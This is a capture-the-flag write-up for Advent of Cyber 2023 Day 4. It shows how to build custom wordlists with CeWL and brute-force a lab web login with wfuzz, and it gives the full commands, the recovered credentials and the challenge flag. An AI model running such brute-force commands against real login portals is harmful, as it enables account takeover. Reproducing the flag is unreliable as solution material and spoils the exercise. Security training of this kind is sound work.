<font size = '4'>
<p align = 'center'>
<b>
Advent of Cyber - Day 4 Writeup 
</b>
</p>
</font>

<br>
<font size = '3'>

<b>Introduction: </b>
This writeup details the solution to Day 4 of the Advent of Cyber 2023 challenge titled 'CeWL Brute Force'. AntarctiCrafts, a renowned ice sculpture and toy company, faces a security breach due to credentials sold by McGreedy. The attacker used a customized wordlist generated by CeWL to successfully perform a brute-force attack on the company's communication portal.<br>

<b>Author:</b> Misha Jain

<b>Date:</b> December 4, 2023

<b>Tools Used:</b><br>
- CeWL
- wfuzz
- AttackBox
- Web Browser

<b>Challenge Description:</b><br>
Day 4 introduces CeWL, a custom word list generator that spiders websites to create word lists based on the site's content. The challenge involves using CeWL to generate customized wordlists from the AntarctiCrafts website and performing a brute-force attack on the login portal using the generated wordlists.

<b>Exploitation:</b><br>
1. Click on the "Start Machine" button for both the Target Machine and AttackBox. Once both machines are started, visit http://10.10.153.88/ in the AttackBox’s web browser.<br><br>

2. Generate Password Wordlist:<br>
Use CeWL to generate a wordlist from the AntarctiCrafts homepage. Set the spidering depth to 2, minimum word length to 5, and include numbers in the words. Save the output to a file.<br><br><p align = 'center'>cewl -d 2 -m 5 -w passwords.txt http://10.10.153.88 --with-numbers</p><br>
Generate Username Wordlist:<br>
Use CeWL to generate a wordlist from the Team Members page. Set the spidering depth to 0 (no external links), minimum word length to 5, and convert all words to lowercase. Save the output to a file.<br><br><p align = 'center'>cewl -d 0 -m 5 -w usernames.txt http://10.10.153.88/team.php --lowercase</p><br>

3. Use wfuzz to perform a brute-force attack on the login portal. Use the generated username and password wordlists and specify the POST data format.<br><br>

<p align = 'center'>wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.153.88/login.php -d "username=FUZZ&password=FUZ2Z"</p><br>

4. Check the wfuzz output for a successful combination of username and password. The combination is 'isaias:Happiness'. Use the discovered credentials to log in to the application at http://10.10.153.88/login.php. The flag is 'THM{m3rrY4nt4rct1crAft$}'.<br><br>

<b>Lessons Learned:</b><br>
- Understanding the use of CeWL for custom wordlist generation.
- Leveraging wfuzz for brute-force attacks on web applications.
- The significance of tailored wordlists in targeted attacks.<br><br>

<b>Conclusion:</b><br>
Day 4 of Advent of Cyber 2023 showcased the practical application of CeWL in creating custom wordlists for targeted attacks. The challenge emphasized the impact of specialized tools in security breaches and highlighted the need for robust security measures to counter such threats.

</font>